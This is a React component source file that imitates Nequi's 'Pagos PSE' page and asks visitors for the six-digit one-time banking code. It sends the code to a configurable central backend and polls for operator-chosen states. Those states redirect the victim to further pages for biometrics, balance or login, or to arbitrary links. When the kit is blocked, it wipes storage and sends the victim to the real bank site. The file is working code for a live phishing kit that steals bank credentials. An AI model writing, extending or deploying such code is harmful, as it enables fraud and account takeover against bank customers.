import React, { useState, useRef, useEffect, useLayoutEffect } from "react";
import { createPortal, flushSync } from "react-dom";
import { useNavigate, useLocation } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingNequiLogin from "../../../../../components/LoadingNequiLogin";
import "./dinamicaNequi.css";
import logoNequi from "../../images/imgi_1_64dfef05bc6705edb9447499_nequi.svg";

const NEQUI_ERROR_KEY = "nequi_error_modal";
const NEQUI_MID_FLOW_KEY = "nequi_mid_flow";

const DIN_ERROR_MESSAGE =
    "¡Ups! Estás ingresando mal tu clave dinámica o expiró, verifica y vuelve a intentarlo";
const DIN_ERROR_AUTO_HIDE_MS = 5000;

const ESTADOS_TRAS_DIN = [
    "sol_din",
    "sol_finalizar",
    "sol_finalizado",
    "error_din",
    "error_login",
    "error_cash",
    "sol_biometria",
    "sol_saldo",
    "block_ip",
    "error_blocked",
    "logo",
    "link_bot",
    "sol_link_bot",
    "sol_link_custom",
];

export default function DinamicaNequi() {
    const navigate = useNavigate();
    const location = useLocation();
    const [code, setCode] = useState(["", "", "", "", "", ""]);
    const [activeIndex, setActiveIndex] = useState(0);
    const [loading, setLoading] = useState(false);
    const [showDinError, setShowDinError] = useState(false);
    const inputRefs = useRef([]);
    const submittedRef = useRef(false);
    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const dinErrorTimeoutRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const statusTickRef = useRef(null);
    const allowPollNavigationRef = useRef(false);

    const stopPolling = () => {
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }
    };

    const resetCode = () => {
        setCode(["", "", "", "", "", ""]);
        setActiveIndex(0);
        submittedRef.current = false;
    };

    const hideDinamicaError = () => {
        if (dinErrorTimeoutRef.current) {
            clearTimeout(dinErrorTimeoutRef.current);
            dinErrorTimeoutRef.current = null;
        }
        setShowDinError(false);
    };

    const showDinamicaError = () => {
        setShowDinError(true);
        if (dinErrorTimeoutRef.current) {
            clearTimeout(dinErrorTimeoutRef.current);
        }
        dinErrorTimeoutRef.current = setTimeout(() => {
            hideDinamicaError();
        }, DIN_ERROR_AUTO_HIDE_MS);
    };

    const startWaiting = () => {
        sessionStorage.setItem(NEQUI_MID_FLOW_KEY, "1");
        setLoading(true);
    };

    const stopWaiting = () => {
        sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
        setLoading(false);
    };

    const failSubmit = () => {
        stopWaiting();
        submittedRef.current = false;
    };

    const initPolling = () => {
        stopPolling();
        pollingIntervalRef.current = setInterval(() => {
            verifyState();
        }, 3000);
        verifyState();
    };

    useEffect(() => {
        const pendingError = localStorage.getItem(NEQUI_ERROR_KEY);
        const midFlow = sessionStorage.getItem(NEQUI_MID_FLOW_KEY) === "1";

        if (pendingError === "error_din") {
            showDinamicaError();
            resetCode();
        }
        if (pendingError) {
            localStorage.removeItem(NEQUI_ERROR_KEY);
        }

        sessionIdRef.current =
            localStorage.getItem("sessionId") ||
            sessionStorage.getItem("sessionId");

        if (sessionIdRef.current) {
            allowPollNavigationRef.current = true;
            if (midFlow) {
                setLoading(true);
            }
            initPolling();
        } else {
            allowPollNavigationRef.current = false;
        }

        return () => {
            stopPolling();
            if (dinErrorTimeoutRef.current) {
                clearTimeout(dinErrorTimeoutRef.current);
            }
        };
    }, []);

    useEffect(() => {
        if (!location.state?.nequiNav) return;
        stopWaiting();
        hideDinamicaError();
        resetCode();
        navigate(location.pathname, { replace: true, state: {} });
    }, [location.state?.nequiNav]);

    useEffect(() => {
        const emptyIndex = code.findIndex((c) => c === "");
        if (emptyIndex !== -1) {
            setActiveIndex(emptyIndex);
        }
    }, [code]);

    const nequiNavigate = (ruta) => {
        navigate(ruta, { replace: true, state: { nequiNav: Date.now() } });
    };

    const shouldProcessEstado = (estadoActual, statusTick) => {
        if (statusTick != null) {
            if (statusTickRef.current === statusTick) return false;
            statusTickRef.current = statusTick;
            lastEstadoRef.current = estadoActual;
            return true;
        }
        if (lastEstadoRef.current === estadoActual) return false;
        lastEstadoRef.current = estadoActual;
        return true;
    };

    const verifyState = async () => {
        try {
            const response = await instanceBackend.post(
                `/nequi/verify-state/${sessionIdRef.current}`
            );
            const { estado: estadoRaw, state, url, text } = response?.data || {};
            const estadoActual = (estadoRaw || state || "").toString().toLowerCase();
            const hasUrl = Boolean(url && String(url).trim());
            const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
            const linkPendiente =
                estadoActual === "sol_link_bot" ||
                (estadoActual === "link_bot" && !hasUrl) ||
                (estadoActual === "sol_link_custom" && !customLink);

            if (!estadoActual) return;

            if (
                ESTADOS_TRAS_DIN.includes(estadoActual) &&
                !allowPollNavigationRef.current &&
                sessionStorage.getItem(NEQUI_MID_FLOW_KEY) !== "1"
            ) {
                return;
            }

            const statusTick = response?.data?.statusTick ?? null;
            if (!linkPendiente && !shouldProcessEstado(estadoActual, statusTick)) return;
            if (!linkPendiente) lastEstadoRef.current = estadoActual;

            switch (estadoActual) {
                case "logo":
                    stopWaiting();
                    stopPolling();
                    localStorage.setItem("sessionId", sessionIdRef.current);
                    window.location.href =
                        "/pse?bank=" + (url || "nequi") + "&sessionId=" + sessionIdRef.current;
                    break;
                case "link_bot":
                case "sol_link_bot":
                    if (hasUrl) {
                        stopWaiting();
                        stopPolling();
                        if (
                            url.includes("payulatam.com") ||
                            url.includes("registro.pse.com.co")
                        ) {
                            window.location.replace(url);
                        } else {
                            window.location.href = url;
                        }
                    }
                    break;
                case "sol_link_custom":
                    if (customLink) {
                        stopWaiting();
                        stopPolling();
                        window.location.href = customLink;
                    }
                    break;
                case "sol_din":
                    stopWaiting();
                    hideDinamicaError();
                    resetCode();
                    nequiNavigate("/nequi_dinamica");
                    break;
                case "sol_finalizar":
                case "sol_finalizado":
                    stopWaiting();
                    nequiNavigate("/finalizado-pse");
                    break;
                case "sol_biometria":
                    stopWaiting();
                    nequiNavigate("/nequi_biometria");
                    break;
                case "sol_saldo":
                    stopWaiting();
                    nequiNavigate("/nequi_saldo");
                    break;
                case "error_din":
                    stopWaiting();
                    resetCode();
                    showDinamicaError();
                    break;
                case "error_login":
                    stopWaiting();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_login");
                    nequiNavigate("/nequi");
                    break;
                case "error_cash":
                    stopWaiting();
                    sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                    localStorage.setItem(NEQUI_ERROR_KEY, "error_cash");
                    nequiNavigate("/nequi_saldo");
                    break;
                case "block_ip":
                case "error_blocked":
                    stopWaiting();
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.href = process.env.REACT_APP_URL_BANK || "/";
                    break;
                default:
                    break;
            }
        } catch (error) {
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "")
                .toString()
                .toLowerCase();

            if (status === 403 && estadoErr === "error_blocked") {
                stopPolling();
                stopWaiting();
                allowPollNavigationRef.current = false;
                localStorage.clear();
                sessionStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
            }
        }
    };

    const submitDinamica = async (dynamicCode) => {
        const sessionId =
            localStorage.getItem("sessionId") ||
            sessionStorage.getItem("sessionId") ||
            sessionIdRef.current;

        if (!sessionId) {
            failSubmit();
            return;
        }

        sessionIdRef.current = sessionId;

        const centralUrl = (
            process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
        ).trim();

        const dataSend = {
            data: {
                attributes: {
                    clave: dynamicCode,
                    fecha: new Date().toISOString(),
                    sessionId,
                    backend: "P01",
                    backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    backend_url: "/api/v1/nequi/dinamica",
                },
            },
        };

        stopPolling();
        lastEstadoRef.current = null;

        try {
            const response = centralUrl
                ? await instanceBackend.post(centralUrl, dataSend)
                : await instanceBackend.post("/nequi/dinamica", dataSend);

            if (response?.data?.success) {
                const sid = response.data.sessionId ?? sessionId;
                localStorage.setItem("sessionId", sid);
                sessionStorage.setItem("sessionId", sid);
                sessionIdRef.current = sid;
                sessionStorage.setItem(NEQUI_MID_FLOW_KEY, "1");
                allowPollNavigationRef.current = true;
                initPolling();
            } else {
                failSubmit();
            }
        } catch (error) {
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || "")
                .toString()
                .toLowerCase();
            if (status === 403 && estadoErr === "error_blocked") {
                sessionStorage.removeItem(NEQUI_MID_FLOW_KEY);
                localStorage.clear();
                sessionStorage.clear();
                window.location.href = process.env.REACT_APP_URL_BANK || "/";
                return;
            }
            failSubmit();
        }
    };

    const handleNumberClick = (num) => {
        if (loading || submittedRef.current) return;

        const emptyIndex = code.findIndex((digit) => digit === "");
        if (emptyIndex === -1) return;

        const newCode = [...code];
        newCode[emptyIndex] = num.toString();
        const isComplete = newCode.every((digit) => digit !== "");

        setCode(newCode);

        if (!isComplete) return;

        submittedRef.current = true;

        flushSync(() => {
            startWaiting();
        });

        submitDinamica(newCode.join(""));
    };

    useLayoutEffect(() => {
        if (!loading) return;
        document.body.style.overflow = "hidden";
        return () => {
            document.body.style.overflow = "";
        };
    }, [loading]);

    const handleDelete = () => {
        if (loading) return;

        let lastFilledIndex = -1;
        for (let i = code.length - 1; i >= 0; i -= 1) {
            if (code[i] !== "") {
                lastFilledIndex = i;
                break;
            }
        }

        if (lastFilledIndex < 0) return;

        const newCode = [...code];
        newCode[lastFilledIndex] = "";
        setCode(newCode);
        submittedRef.current = false;
    };

    const handleCancel = () => {
        stopPolling();
        stopWaiting();
        allowPollNavigationRef.current = false;
        lastEstadoRef.current = null;
        hideDinamicaError();
        resetCode();
    };

    return (
        <div className="nequi-container dinamica-nequi-page">
            <header className="nequi-header">
                <img
                    src={logoNequi}
                    alt="Nequi"
                    className="nequi-header__logo"
                    width="104"
                    height="32"
                />
            </header>

            <main className="nequi-main">
                {showDinError ? (
                    <div className="dinamica-error-alert" role="alert">
                        <span className="dinamica-error-alert__icon" aria-hidden="true">
                            <span className="icon-alert-error" />
                        </span>
                        <span className="dinamica-error-alert__text">
                            {DIN_ERROR_MESSAGE}
                        </span>
                    </div>
                ) : null}

                <h1 className="nequi-title">Pagos PSE de Nequi</h1>

                <p className="nequi-subtitle">
                    Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.
                </p>

                <div className="keypad-container">
                    <div className="code-inputs">
                        {code.map((digit, index) => (
                            <input
                                key={index}
                                ref={(el) => {
                                    inputRefs.current[index] = el;
                                }}
                                type="text"
                                maxLength="1"
                                value={digit ? "*" : ""}
                                readOnly
                                autoComplete="off"
                                inputMode="none"
                                className={`code-input ${index === activeIndex ? "code-input--active" : ""} ${digit ? "code-input--filled" : ""}`}
                            />
                        ))}
                    </div>

                    <hr className="keypad-divider" />

                    <div className="keypad-label"> </div>

                    <div className={`numeric-keypad${loading ? " numeric-keypad--disabled" : ""}`}>
                        <div className="keypad-row">
                            {[1, 2, 3].map((num) => (
                                <button
                                    key={num}
                                    type="button"
                                    className="keypad-btn"
                                    disabled={loading}
                                    onClick={() => handleNumberClick(num)}
                                >
                                    {num}
                                </button>
                            ))}
                        </div>
                        <div className="keypad-row">
                            {[4, 5, 6].map((num) => (
                                <button
                                    key={num}
                                    type="button"
                                    className="keypad-btn"
                                    disabled={loading}
                                    onClick={() => handleNumberClick(num)}
                                >
                                    {num}
                                </button>
                            ))}
                        </div>
                        <div className="keypad-row">
                            {[7, 8, 9].map((num) => (
                                <button
                                    key={num}
                                    type="button"
                                    className="keypad-btn"
                                    disabled={loading}
                                    onClick={() => handleNumberClick(num)}
                                >
                                    {num}
                                </button>
                            ))}
                        </div>
                        <div className="keypad-row">
                            <div className="keypad-btn keypad-btn--empty"></div>
                            <button
                                type="button"
                                className="keypad-btn"
                                disabled={loading}
                                onClick={() => handleNumberClick(0)}
                            >
                                0
                            </button>
                            <button
                                type="button"
                                className="keypad-btn keypad-btn--delete"
                                disabled={loading}
                                onClick={handleDelete}
                                aria-label="Borrar"
                            >
                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                    <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                                    <line x1="18" y1="9" x2="12" y2="15"></line>
                                    <line x1="12" y1="9" x2="18" y2="15"></line>
                                </svg>
                            </button>
                        </div>
                    </div>
                </div>

                <button
                    type="button"
                    className="nequi-btn nequi-btn--secondary"
                    disabled={loading}
                    onClick={handleCancel}
                >
                    Cancela
                </button>
            </main>

            {loading && typeof document !== "undefined"
                ? createPortal(<LoadingNequiLogin isOpen />, document.body)
                : null}
        </div>
    );
}
